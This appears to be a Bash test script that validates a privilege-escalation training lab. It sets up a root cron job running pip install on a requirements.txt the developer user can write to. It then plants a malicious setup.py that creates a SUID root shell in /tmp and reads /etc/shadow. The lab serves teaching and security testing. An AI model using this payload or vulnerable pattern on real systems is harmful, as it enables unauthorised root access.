#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab
# Scenario: Pip Requirements Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

export PATH="/usr/sbin:/sbin:$PATH"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

TEST_USER="developer"
TEST_PASS="developer123"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    pkill -u "$TEST_USER" 2>/dev/null || true
    userdel -r "$TEST_USER" 2>/dev/null || true

    rm -f /etc/cron.d/update-deps 2>/dev/null || true
    rm -f /usr/local/bin/update-deps.sh 2>/dev/null || true
    rm -rf /srv/webapp 2>/dev/null || true
    rm -f /var/log/update-deps.log 2>/dev/null || true

    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true
    rm -f /root/pwned_by_developer 2>/dev/null || true

    # Clean up any installed evil package
    pip3 uninstall -y evil-package 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "Python3 available"
    if command -v python3 &> /dev/null; then
        log_pass
    else
        log_fail "python3 installed" "python3 not found"
        exit 1
    fi

    log_check "pip3 available"
    if command -v pip3 &> /dev/null; then
        log_pass
    else
        log_fail "pip3 installed" "pip3 not found"
        exit 1
    fi

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating DevOps)"

    log_step "Creating developer user..."
    useradd -m -s /bin/bash "$TEST_USER"
    echo "$TEST_USER:$TEST_PASS" | chpasswd

    log_check "Developer user created"
    if id "$TEST_USER" &>/dev/null; then
        log_pass
    else
        log_fail "user exists" "user not found"
    fi

    log_step "Creating application directory..."
    mkdir -p /srv/webapp
    chown -R "$TEST_USER:$TEST_USER" /srv/webapp

    log_step "Creating application files..."
    cat > /srv/webapp/app.py << 'EOF'
#!/usr/bin/env python3
print("Hello, World!")
EOF

    cat > /srv/webapp/requirements.txt << 'EOF'
# Application dependencies
# Add packages here
EOF

    chown "$TEST_USER:$TEST_USER" /srv/webapp/app.py /srv/webapp/requirements.txt

    log_step "Creating dependency update script..."
    cat > /usr/local/bin/update-deps.sh << 'SCRIPT'
#!/bin/bash
APP_DIR="/srv/webapp"
LOG="/var/log/update-deps.log"

echo "[$(date)] Starting dependency update" >> "$LOG"
cd "$APP_DIR"

# VULNERABLE: pip install as root on user-controlled requirements
pip3 install -r requirements.txt --upgrade 2>> "$LOG"

echo "[$(date)] Update complete" >> "$LOG"
SCRIPT

    chmod 755 /usr/local/bin/update-deps.sh
    chown root:root /usr/local/bin/update-deps.sh

    log_step "Creating cron job..."
    echo "*/5 * * * * root /usr/local/bin/update-deps.sh" > /etc/cron.d/update-deps
    chmod 644 /etc/cron.d/update-deps

    touch /var/log/update-deps.log
    chmod 644 /var/log/update-deps.log

    log_info "Environment setup complete"
    log_info "Trust boundary: root runs pip on developer-controlled requirements.txt"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "Developer has no sudo access"
    SUDO_CHECK=$(su - "$TEST_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "Developer CAN modify requirements.txt"
    su - "$TEST_USER" -c 'echo "# test" >> /srv/webapp/requirements.txt'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker can modify requirements.txt but has no root access"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker examines application directory..."

    log_check "Attacker finds requirements.txt"
    if su - "$TEST_USER" -c 'test -w /srv/webapp/requirements.txt'; then
        log_pass
    else
        log_fail "requirements.txt writable" "not writable"
    fi

    log_check "Update script runs pip as root"
    SCRIPT_CONTENT=$(su - "$TEST_USER" -c 'cat /usr/local/bin/update-deps.sh')
    if echo "$SCRIPT_CONTENT" | grep -q "pip3 install"; then
        log_pass
    else
        log_fail "pip install found" "not found"
    fi

    log_check "Cron runs as root"
    CRON_CONTENT=$(su - "$TEST_USER" -c 'cat /etc/cron.d/update-deps')
    if echo "$CRON_CONTENT" | grep -q "root"; then
        log_pass
    else
        log_fail "root in cron" "not root"
    fi

    log_info "Attacker identifies: root runs pip install on writable requirements.txt"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker creates malicious local package..."
    su - "$TEST_USER" -c 'mkdir -p /srv/webapp/evil_package'

    su - "$TEST_USER" -c 'cat > /srv/webapp/evil_package/setup.py << '\''EOF'\''
from setuptools import setup
import os

# Malicious code executed during pip install
os.system("cp /bin/bash /tmp/rootbash")
os.system("chmod 4755 /tmp/rootbash")
os.system("echo Pwned at $(date) > /tmp/pwned.txt")
os.system("chmod 644 /tmp/pwned.txt")

setup(
    name="evil-package",
    version="1.0.0",
    description="Totally legitimate package",
    py_modules=["evil"],
)
EOF'

    su - "$TEST_USER" -c 'echo "# Evil module" > /srv/webapp/evil_package/evil.py'

    log_check "Malicious package created"
    if [[ -f /srv/webapp/evil_package/setup.py ]]; then
        log_pass
    else
        log_fail "setup.py exists" "not found"
    fi

    log_step "Attacker modifies requirements.txt..."
    su - "$TEST_USER" -c 'echo "./evil_package" >> /srv/webapp/requirements.txt'

    log_check "requirements.txt modified"
    if grep -q "evil_package" /srv/webapp/requirements.txt; then
        log_pass
    else
        log_fail "evil_package in requirements" "not found"
    fi

    log_info "Malicious package staged"
    log_attack "When root runs pip install, setup.py executes as root"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Pip Install"

    log_step "Simulating cron execution (root runs update script)..."
    /usr/local/bin/update-deps.sh 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (setup.py did not execute)"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_check "/tmp/pwned.txt created"
    if [[ -f /tmp/pwned.txt ]]; then
        log_pass
        log_info "Contents: $(cat /tmp/pwned.txt)"
    else
        log_fail "file exists" "not found"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "Developer achieves euid=0 (root)"
    ID_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    log_check "Developer can read /etc/shadow"
    SHADOW_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "head -1 /etc/shadow"' 2>&1)
    if echo "$SHADOW_CHECK" | grep -q ":"; then
        log_pass
    else
        log_fail "shadow content" "$SHADOW_CHECK"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  developer (uid=1001)                       ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      Pip Requirements Injection                 ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  The lab correctly demonstrates:"
        echo "    1. Developer with write access to requirements.txt"
        echo "    2. Root cron job running pip install"
        echo "    3. Malicious setup.py code execution"
        echo "    4. Privilege escalation from developer to root"
        echo ""
        echo "  Attack chain:"
        echo "    developer → pip requirements injection → root (euid=0)"
        echo ""
    else
        echo -e "${RED}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}  ║              SOME TESTS FAILED — REVIEW OUTPUT            ║${NC}"
        echo -e "${RED}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab — Automated Test"
    echo ""
    echo "  Scenario: Automated Dependency Management"
    echo "  Attack:   Pip Requirements Injection"
    echo "  Goal:     developer → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"
